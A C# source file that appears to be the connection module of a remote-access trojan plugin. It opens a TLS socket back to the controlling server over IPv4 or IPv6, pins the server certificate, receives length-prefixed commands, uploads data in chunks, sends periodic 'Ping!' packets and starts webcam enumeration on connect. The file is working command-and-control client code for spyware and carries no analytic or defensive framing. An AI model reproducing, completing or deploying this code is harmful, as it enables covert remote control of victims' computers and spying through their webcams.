using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Connection
    {
        public static Socket TcpClient { get; set; }
        public static Socket TcpClientV6 { get; set; }
        public static SslStream SslClient { get; set; }
        public static X509Certificate2 ServerCertificate { get; set; }
        private static byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        private static Timer Tick { get; set; }
        public static bool IsConnected { get; set; }
        public static bool IsConnectedV6 { get; set; }
        private static object SendSync { get; } = new object();
        public static string Hwid { get; set; }

        public static void InitializeClient()
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };
                TcpClientV6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                IPEndPoint remoteEndPoint = (IPEndPoint)Plugin.Socket.RemoteEndPoint;

                if (IPAddress.TryParse(remoteEndPoint.Address.ToString(), out IPAddress i4or6))
                {
                    switch (i4or6.AddressFamily)
                    {
                        case System.Net.Sockets.AddressFamily.InterNetwork:
                            TcpClient.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
                            if (TcpClient.Connected)
                            {
                                //Debug.WriteLine("plugins ipv4 connected");
                            }
                            break;
                        case System.Net.Sockets.AddressFamily.InterNetworkV6:
                            TcpClientV6.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
                            if (TcpClientV6.Connected)
                            {
                                //Debug.WriteLine("plugins ipv6 connected");
                            }
                            break;
                    }
                }
                if (TcpClient.Connected)
                {
                    Debug.WriteLine("Plugin Connected!");
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);

                    new Thread(() =>
                    {
                        Packet.GetWebcams();
                    }).Start();

                }
                else
                {
                    IsConnected = false;
                    if (TcpClientV6.Connected)
                    {
                        Debug.WriteLine("Plugin Connected!");
                        IsConnectedV6 = true;
                        SslClient = new SslStream(new NetworkStream(TcpClientV6, true), false, ValidateServerCertificate);
                        SslClient.AuthenticateAsClient(TcpClientV6.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                        HeaderSize = 4;
                        Buffer = new byte[HeaderSize];
                        Offset = 0;
                        Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                        SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);

                        new Thread(() =>
                        {
                            Packet.GetWebcams();
                        }).Start();

                    }
                    else
                    {
                        IsConnectedV6 = false;
                        return;
                    }
                }
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                IsConnected = false;
                IsConnectedV6 = false;
                return;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return ServerCertificate.Equals(certificate);
        }

        public static void Disconnected()
        {

            try
            {
                IsConnected = false;
                IsConnectedV6 = false; 
                Packet.IsOk = false;
                Tick?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
                TcpClientV6?.Dispose();
            }
            catch { }
        }

        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    if (!TcpClientV6.Connected || !IsConnectedV6)
                    {
                        IsConnectedV6 = false;
                        return;
                    }
                    else
                    {
                        goto accessed;
                    }
                }
            accessed:
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        Debug.WriteLine("/// Plugin Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    IsConnectedV6 = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    IsConnectedV6 = false;
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        IsConnectedV6 = false;
                        return;
                    }
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    IsConnectedV6 = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                IsConnectedV6 = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null)
                    {
                        if (!IsConnectedV6)
                        {
                            return;
                        }
                        else
                        {
                            if (msg == null)
                            {
                                return;
                            }
                            else
                            {
                                goto next1;
                            }

                        }
                    }
                next1:
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    if (IsConnected)
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                    }
                    else
                    {
                        TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                    }
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                if (IsConnected)
                                {
                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                                }
                                else
                                {
                                    TcpClientV6.Poll(-1, SelectMode.SelectWrite);
                                }
                                SslClient.Write(chunk, 0, read);
                            }
                        }
                    }
                    else
                    {
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                    Debug.WriteLine("Plugin Packet Sent");
                }
                catch
                {
                    IsConnected = false;
                    IsConnectedV6 = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Ping!)";
            Send(msgpack.Encode2Bytes());
            GC.Collect();
        }

    }
}
